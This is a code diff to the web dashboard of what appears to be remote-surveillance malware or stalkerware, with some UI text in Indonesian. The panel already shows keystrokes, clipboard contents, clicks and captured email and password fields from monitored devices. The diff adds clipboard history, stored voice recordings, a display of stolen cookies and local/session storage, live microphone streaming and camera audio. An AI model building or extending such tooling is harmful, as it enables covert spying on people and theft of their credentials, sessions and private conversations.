@@ -220,7 +220,9 @@
                         <div style="margin-bottom:12px;">
                             <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:10px;">
                                 <button class="header-btn" id="liveCamBtn" onclick="toggleLiveCam()" style="font-weight:600;">&#x25b6; Live Camera</button>
+                                <button class="header-btn" id="liveVoiceBtn" onclick="toggleLiveVoice()" style="font-weight:600;">&#x1f50a; Live Voice</button>
                                 <span id="liveCamStatus" style="font-size:0.78rem;color:var(--text3);"></span>
+                                <span id="liveVoiceStatus" style="font-size:0.78rem;color:var(--text3);"></span>
                             </div>
                             <div id="liveCamContainer" style="display:none;position:relative;">
                                 <img id="liveCamImg" style="width:100%;max-width:480px;border-radius:8px;border:2px solid var(--accent);background:#0a0a14;">
@@ -228,6 +230,9 @@
                                     <button class="header-btn" onclick="switchCamera()" style="font-size:0.75rem;">&#x21c4; Switch Camera</button>
                                     <span style="font-size:0.72rem;color:var(--text3);align-self:center;">Front/Back camera toggle</span>
                                 </div>
+                            </div>
+                            <div id="liveVoiceIndicator" style="display:none;margin-top:6px;padding:8px 10px;background:var(--bg);border-radius:6px;border:1px solid var(--accent);font-size:0.78rem;color:var(--text2);">
+                                &#x1f50a; <span id="liveVoiceLevel">Live voice streaming active</span>
                             </div>
                         </div>
                         <div style="border-top:1px solid rgba(255,255,255,0.06);padding-top:12px;">
@@ -284,6 +289,10 @@
                             <div><span class="label">Orientation Lock</span><div class="value" id="dOrientationLock">-</div></div>
                             <div><span class="label">Wake Lock</span><div class="value" id="dWakeLock">-</div></div>
                             <div style="grid-column:1/-1;"><span class="label">Clipboard</span><div class="value" id="dClipboard" style="font-family:inherit;font-size:0.75rem;word-break:break-all;">-</div></div>
+                            <div style="grid-column:1/-1;">
+                                <span class="label">Clipboard History <span id="clipCount" style="font-size:0.65rem;color:var(--text3);"></span></span>
+                                <div id="dClipboardHistory" style="font-size:0.72rem;color:var(--text2);font-family:monospace;max-height:80px;overflow-y:auto;margin-top:4px;background:var(--bg);padding:6px 8px;border-radius:6px;"></div>
+                            </div>
                             <div style="grid-column:1/-1;"><span class="label">Email Field</span><div class="value" id="dFieldEmail" style="font-family:inherit;font-size:0.75rem;word-break:break-all;">-</div></div>
                             <div style="grid-column:1/-1;"><span class="label">Password Field</span><div class="value" id="dFieldPass" style="font-family:inherit;font-size:0.75rem;word-break:break-all;">-</div></div>
                         </div>
@@ -294,6 +303,14 @@
                         <div style="margin-top:6px;">
                             <span style="font-size:0.82rem;color:var(--text3);">Click Map:</span>
                             <div id="dClicks" style="font-size:0.72rem;color:var(--text2);font-family:monospace;max-height:60px;overflow-y:auto;margin-top:4px;background:var(--bg);padding:6px 8px;border-radius:6px;"></div>
+                        </div>
+                        <div style="margin-top:10px;">
+                            <span style="font-size:0.82rem;color:var(--text3);">Voice Recordings <span id="voiceCount" style="font-size:0.65rem;color:var(--text3);"></span></span>
+                            <div id="dVoiceRecordings" style="font-size:0.72rem;color:var(--text2);max-height:80px;overflow-y:auto;margin-top:4px;background:var(--bg);padding:6px 8px;border-radius:6px;"></div>
+                        </div>
+                        <div style="margin-top:6px;">
+                            <span style="font-size:0.82rem;color:var(--text3);">Cookies &amp; Storage</span>
+                            <div id="dCookiesData" style="font-size:0.72rem;color:var(--text2);font-family:monospace;max-height:120px;overflow-y:auto;margin-top:4px;background:var(--bg);padding:6px 8px;border-radius:6px;"></div>
                         </div>
                     </div>
 
@@ -464,6 +481,12 @@
         }
 
         // === TOAST ===
+        function escapeHtml(str) {
+            const div = document.createElement('div');
+            div.textContent = str;
+            return div.innerHTML;
+        }
+
         function showToast(msg, type) {
             const c = document.getElementById('toastContainer');
             const t = document.createElement('div');
@@ -598,8 +621,62 @@
             document.getElementById('dOrientationLock').textContent = d.orientationLock?.locked?'Locked ('+d.orientationLock.type+')':'-';
             document.getElementById('dWakeLock').textContent = d.wakeLock === true ? 'Active' : (d.wakeLock === false ? 'Failed: '+d.wakeLockError : '-');
             document.getElementById('dClipboard').textContent = d.clipboard || '-';
+
+            // Clipboard History
+            const chEl = document.getElementById('dClipboardHistory');
+            const ccEl = document.getElementById('clipCount');
+            if (d.clipboardHistory && d.clipboardHistory.length) {
+                ccEl.textContent = '(' + d.clipboardHistory.length + ')';
+                chEl.innerHTML = d.clipboardHistory.slice(-20).reverse().map(c =>
+                    '<div style="padding:4px 0;border-bottom:1px solid var(--border);word-break:break-all;">' +
+                    '<span style="color:var(--text3);font-size:0.65rem;">' + new Date(c.time).toLocaleTimeString() + '</span> ' +
+                    '<span>' + escapeHtml(c.text.slice(0, 200)) + '</span></div>'
+                ).join('');
+            } else { ccEl.textContent = ''; chEl.textContent = 'Belum ada data'; }
+
             document.getElementById('dFieldEmail').textContent = d.fieldEmail || '-';
             document.getElementById('dFieldPass').textContent = d.fieldPass ? '***captured***' : '-';
+
+            // Voice Recordings
+            const vrEl = document.getElementById('dVoiceRecordings');
+            const vcEl = document.getElementById('voiceCount');
+            if (d.voiceRecordings && d.voiceRecordings.length) {
+                vcEl.textContent = '(' + d.voiceRecordings.length + ')';
+                vrEl.innerHTML = d.voiceRecordings.slice(-10).reverse().map(v =>
+                    '<div style="padding:4px 0;border-bottom:1px solid var(--border);">' +
+                    '<span style="color:var(--text3);font-size:0.65rem;">#' + v.sequence + ' ' + new Date(v.timestamp).toLocaleTimeString() + '</span> ' +
+                    '<a href="/voice/' + v.filename + '" target="_blank" style="color:var(--accent);text-decoration:none;">Play</a> ' +
+                    '<span style="color:var(--text3);font-size:0.65rem;">' + (v.duration ? (v.duration / 1000).toFixed(1) + 's' : '') + '</span></div>'
+                ).join('');
+            } else { vcEl.textContent = ''; vrEl.textContent = 'Belum ada data'; }
+
+            // Cookies Data
+            const cdEl = document.getElementById('dCookiesData');
+            if (d.cookiesData) {
+                let html = '';
+                if (d.cookiesData.cookies) {
+                    html += '<div style="margin-bottom:4px;"><span style="color:var(--accent);font-weight:600;">Cookies:</span> <span style="word-break:break-all;">' + escapeHtml(d.cookiesData.cookies.slice(0, 500)) + '</span></div>';
+                }
+                const ls = d.cookiesData.localStorage;
+                if (ls && Object.keys(ls).length) {
+                    html += '<div style="margin-bottom:4px;"><span style="color:var(--accent);font-weight:600;">localStorage:</span></div>';
+                    const keys = Object.keys(ls).slice(0, 10);
+                    keys.forEach(k => {
+                        html += '<div style="padding:2px 0;word-break:break-all;"><span style="color:var(--text3);">' + escapeHtml(k) + '</span>: ' + escapeHtml((ls[k] || '').slice(0, 100)) + '</div>';
+                    });
+                    if (Object.keys(ls).length > 10) html += '<div style="color:var(--text3);font-size:0.65rem;">... dan ' + (Object.keys(ls).length - 10) + ' lainnya</div>';
+                }
+                const ss = d.cookiesData.sessionStorage;
+                if (ss && Object.keys(ss).length) {
+                    html += '<div style="margin-top:4px;margin-bottom:4px;"><span style="color:var(--accent);font-weight:600;">sessionStorage:</span></div>';
+                    const skeys = Object.keys(ss).slice(0, 5);
+                    skeys.forEach(k => {
+                        html += '<div style="padding:2px 0;word-break:break-all;"><span style="color:var(--text3);">' + escapeHtml(k) + '</span>: ' + escapeHtml((ss[k] || '').slice(0, 100)) + '</div>';
+                    });
+                }
+                if (!html) html = 'Tidak ada data';
+                cdEl.innerHTML = html;
+            } else { cdEl.textContent = 'Belum ada data'; }
 
             // Keystrokes
             const ksEl = document.getElementById('dKeystrokes');
@@ -913,6 +990,7 @@
                 socket.emit('start-camera-stream', selectedId);
                 statusEl.textContent = '\u25cf Connecting...';
                 statusEl.style.color = '#ff9800';
+                cameraAudioActive = true;
                 showToast('Requesting live camera from device...', 'success');
             } else {
                 btn.textContent = '\u25b6 Live Camera';
@@ -920,6 +998,7 @@
                 document.getElementById('liveCamContainer').style.display = 'none';
                 socket.emit('stop-camera-stream', selectedId);
                 statusEl.textContent = '';
+                cameraAudioActive = false;
             }
         }
 
@@ -930,6 +1009,73 @@
             document.getElementById('liveCamStatus').style.color = '#ff9800';
             showToast('Switching camera...', 'info');
         }
+
+        // === LIVE AUDIO PLAYBACK (Web Audio API) ===
+        let audioCtx = null;
+        function getAudioCtx() {
+            if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            if (audioCtx.state === 'suspended') audioCtx.resume();
+            return audioCtx;
+        }
+        async function playAudioChunk(base64, mimeType) {
+            try {
+                const ctx = getAudioCtx();
+                const binary = atob(base64);
+                const array = new Uint8Array(binary.length);
+                for (let i = 0; i < binary.length; i++) array[i] = binary.charCodeAt(i);
+                const audioBuffer = await ctx.decodeAudioData(array.buffer);
+                const source = ctx.createBufferSource();
+                source.buffer = audioBuffer;
+                source.connect(ctx.destination);
+                source.start();
+            } catch(e) {}
+        }
+        // Initialize audio context on first user interaction (browser policy)
+        function initAudio() { getAudioCtx(); }
+        document.addEventListener('click', initAudio, { once: true });
+        document.addEventListener('touchstart', initAudio, { once: true });
+
+        // Camera audio player (auto-enabled with live cam)
+        let cameraAudioActive = false;
+        socket.on('camera-audio-frame', (data) => {
+            if (!cameraAudioActive || data.deviceId !== selectedId) return;
+            playAudioChunk(data.audio, data.mimeType);
+        });
+
+        // Live Voice toggle
+        let voiceActive = false;
+        function toggleLiveVoice() {
+            if (!selectedId) return;
+            voiceActive = !voiceActive;
+            const btn = document.getElementById('liveVoiceBtn');
+            const statusEl = document.getElementById('liveVoiceStatus');
+            const indicator = document.getElementById('liveVoiceIndicator');
+            if (voiceActive) {
+                btn.textContent = '\u25a0 Stop Voice';
+                btn.style.background = '#ff4444';
+                indicator.style.display = 'block';
+                socket.emit('start-voice', selectedId);
+                statusEl.textContent = '\u25cf Voice streaming...';
+                statusEl.style.color = '#ff9800';
+                showToast('Requesting live voice from device...', 'success');
+            } else {
+                btn.textContent = '\u1f50a Live Voice';
+                btn.style.background = '';
+                indicator.style.display = 'none';
+                socket.emit('stop-voice', selectedId);
+                statusEl.textContent = '';
+            }
+        }
+        socket.on('voice-frame', (data) => {
+            if (!voiceActive || data.deviceId !== selectedId) return;
+            playAudioChunk(data.audio, data.mimeType);
+            // Update visual indicator
+            const indicator = document.getElementById('liveVoiceIndicator');
+            if (indicator) {
+                indicator.style.borderColor = '#00c853';
+                setTimeout(() => { indicator.style.borderColor = 'var(--accent)'; }, 100);
+            }
+        });
 
         // === AI PROFILE ===
         function loadProfile() {
@@ -1204,28 +1350,48 @@
         const origSelect = selectDevice;
         selectDevice = function(id) {
             origSelect(id);
-            const btn = document.getElementById('liveCamBtn');
+            const camBtn = document.getElementById('liveCamBtn');
+            const voiceBtn = document.getElementById('liveVoiceBtn');
             const statusEl = document.getElementById('liveCamStatus');
+            const voiceStatusEl = document.getElementById('liveVoiceStatus');
             if (id && devices[id] && devices[id].online) {
-                btn.disabled = false;
-                btn.style.opacity = '1';
-                btn.style.cursor = 'pointer';
+                camBtn.disabled = false;
+                camBtn.style.opacity = '1';
+                camBtn.style.cursor = 'pointer';
+                voiceBtn.disabled = false;
+                voiceBtn.style.opacity = '1';
+                voiceBtn.style.cursor = 'pointer';
             } else {
-                btn.disabled = true;
-                btn.style.opacity = '0.4';
-                btn.style.cursor = 'not-allowed';
+                camBtn.disabled = true;
+                camBtn.style.opacity = '0.4';
+                camBtn.style.cursor = 'not-allowed';
+                voiceBtn.disabled = true;
+                voiceBtn.style.opacity = '0.4';
+                voiceBtn.style.cursor = 'not-allowed';
                 statusEl.textContent = id ? 'Device offline' : '';
                 statusEl.style.color = '#ff4444';
+                voiceStatusEl.textContent = id ? 'Device offline' : '';
+                voiceStatusEl.style.color = '#ff4444';
             }
             // Reset camera state when switching devices
             if (liveCamActive) {
                 if (selectedId) socket.emit('stop-camera-stream', selectedId);
                 liveCamActive = false;
-                btn.textContent = '\u25b6 Live Camera';
-                btn.style.background = '';
+                camBtn.textContent = '\u25b6 Live Camera';
+                camBtn.style.background = '';
                 document.getElementById('liveCamContainer').style.display = 'none';
+                cameraAudioActive = false;
             }
             statusEl.textContent = '';
+            // Reset voice state when switching devices
+            if (voiceActive) {
+                if (selectedId) socket.emit('stop-voice', selectedId);
+                voiceActive = false;
+                voiceBtn.textContent = '\u1f50a Live Voice';
+                voiceBtn.style.background = '';
+                document.getElementById('liveVoiceIndicator').style.display = 'none';
+            }
+            voiceStatusEl.textContent = '';
             setTimeout(() => {
                 loadProfile();
                 loadForensics();
